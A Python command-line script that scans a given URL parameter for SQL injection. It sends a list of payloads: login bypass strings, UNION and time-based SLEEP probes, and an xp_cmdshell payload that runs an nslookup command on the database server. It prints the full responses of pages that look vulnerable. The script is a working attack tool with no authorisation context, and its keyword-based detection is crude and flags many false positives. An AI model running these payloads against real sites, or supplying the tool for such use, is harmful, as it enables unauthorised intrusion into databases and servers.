import requests

# Define SQLi payloads
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR 1=1 -- ",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' UNION SELECT null, null, null -- ",
    "1' AND 1=1 -- ",
    "1' AND 1=2 -- ",
    "' AND SLEEP(5) --",
    "' OR IF(1=1, SLEEP(5), 0); --",
    "1; EXEC xp_cmdshell('nslookup example.com'); --"
]

# Function to test a URL with a given payload
def test_sqli(url, param, payload, method="GET"):
    params = {param: payload}
    try:
        # Send the request
        if method == "GET":
            response = requests.get(url, params=params, timeout=10)
        elif method == "POST":
            response = requests.post(url, data=params, timeout=10)
        
        # Check for common SQLi indicators in the response
        if any(indicator in response.text.lower() for indicator in ["syntax error", "mysql", "sql", "warning", "error"]) or \
           response.status_code == 500:
            return True, response.text
        else:
            return False, response.text
    except requests.exceptions.RequestException as e:
        return False, str(e)

# Function to scan a URL for SQLi
def scan_url_for_sqli(url, param, method="GET"):
    for payload in payloads:
        is_vulnerable, response = test_sqli(url, param, payload, method)
        if is_vulnerable:
            print(f"[+] Vulnerable Payload Found: {payload}")
            print(f"Response: {response}")  # Print the full response
        else:
            print(f"[-] Not Vulnerable with Payload: {payload}")

# Main function
if __name__ == "__main__":
    import sys
    target_url = sys.argv[1]
    parameter = sys.argv[2]
    request_method = sys.argv[3]
    
    if request_method not in ["GET", "POST"]:
        print("Invalid request method. Please enter GET or POST.")
    else:
        scan_url_for_sqli(target_url, parameter, request_method)
